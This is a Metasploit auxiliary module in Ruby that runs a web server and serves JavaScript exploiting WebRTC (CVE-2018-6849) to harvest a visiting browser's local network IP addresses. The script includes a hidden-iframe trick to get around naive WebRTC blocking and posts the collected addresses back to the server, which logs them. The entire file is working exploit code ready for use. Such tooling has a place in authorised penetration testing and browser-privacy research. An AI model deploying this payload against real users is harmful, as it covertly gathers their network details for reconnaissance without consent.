##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpServer

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'           => 'HTTP Client LAN IP Address Gather',
        'Description'    => %q(
          This module retrieves a browser's network interface IP addresses
          using WebRTC.
        ),
        'License'        => MSF_LICENSE,
        'Author'         => [
          'Daniel Roesler', # JS Code
          'Dhiraj Mishra'   # MSF Module
         ],
        'References'     => [
           [ 'CVE', '2018-6849' ],
           [ 'URL', 'http://net.ipcalf.com/' ],
           [ 'URL', 'https://datarift.blogspot.in/p/private-ip-leakage-using-webrtc.html' ]
         ],
        'DisclosureDate' => 'Sep 05 2013',
        'Actions'        => [[ 'WebServer' ]],
        'PassiveActions' => [ 'WebServer' ],
        'DefaultAction'  => 'WebServer'
      )
    )
  end

  def run
    exploit # start http server
  end

  def setup
     # code from: https://github.com/diafygi/webrtc-ips
     @html = <<-JS
<script>
//get the IP addresses associated with an account
function getIPs(callback){
    var ip_dups = {};

    //compatibility for firefox and chrome
    var RTCPeerConnection = window.RTCPeerConnection
        || window.mozRTCPeerConnection
        || window.webkitRTCPeerConnection;
    var useWebKit = !!window.webkitRTCPeerConnection;

    //bypass naive webrtc blocking using an iframe
    if(!RTCPeerConnection){
        //NOTE: you need to have an iframe in the page right above the script tag
        //
        //<iframe id="iframe" sandbox="allow-same-origin" style="display: none"></iframe>
        //<script>...getIPs called in here...
        //
        var win = iframe.contentWindow;
        RTCPeerConnection = win.RTCPeerConnection
            || win.mozRTCPeerConnection
            || win.webkitRTCPeerConnection;
        useWebKit = !!win.webkitRTCPeerConnection;
    }

    //minimal requirements for data connection
    var mediaConstraints = {
        optional: [{RtpDataChannels: true}]
    };

    var servers = {iceServers: [{urls: "stun:stun.services.mozilla.com"}]};

    //construct a new RTCPeerConnection
    var pc = new RTCPeerConnection(servers, mediaConstraints);

    function handleCandidate(candidate){
        //match just the IP address
        var ip_regex = /([0-9]{1,3}(\\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/
        var ip_addr = ip_regex.exec(candidate)[1];

        //remove duplicates
        if(ip_dups[ip_addr] === undefined)
            callback(ip_addr);

        ip_dups[ip_addr] = true;
    }

    //listen for candidate events
    pc.onicecandidate = function(ice){

        //skip non-candidate events
        if(ice.candidate)
            handleCandidate(ice.candidate.candidate);
    };

    //create a bogus data channel
    pc.createDataChannel("");

    //create an offer sdp
    pc.createOffer(function(result){

        //trigger the stun server request
        pc.setLocalDescription(result, function(){}, function(){});

    }, function(){});

    //wait for a while to let everything done
    setTimeout(function(){
        //read candidate info from local description
        var lines = pc.localDescription.sdp.split('\\n');

        lines.forEach(function(line){
            if(line.indexOf('a=candidate:') === 0)
                handleCandidate(line);
        });
    }, 1000);
}

getIPs(function(ip){
  //console.log(ip);
  var xmlhttp = new XMLHttpRequest;
  xmlhttp.open('POST', window.location, true);
  xmlhttp.send(ip);
});
</script>
     JS
  end

  def on_request_uri(cli, request)
    case request.method.downcase
    when 'get'
      print_status("#{cli.peerhost}: Sending response (#{@html.size} bytes)")
      send_response(cli, @html)
    when 'post'
      begin
        ip = request.body
        if ip =~ /\A([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})\z/
          print_good("#{cli.peerhost}: Found IP address: #{ip}")
        else
          print_error("#{cli.peerhost}: Received malformed IP address")
        end
      rescue
        print_error("#{cli.peerhost}: Received malformed reply")
      end
    else
      print_error("#{cli.peerhost}: Unhandled method: #{request.method}")
    end
  end
end
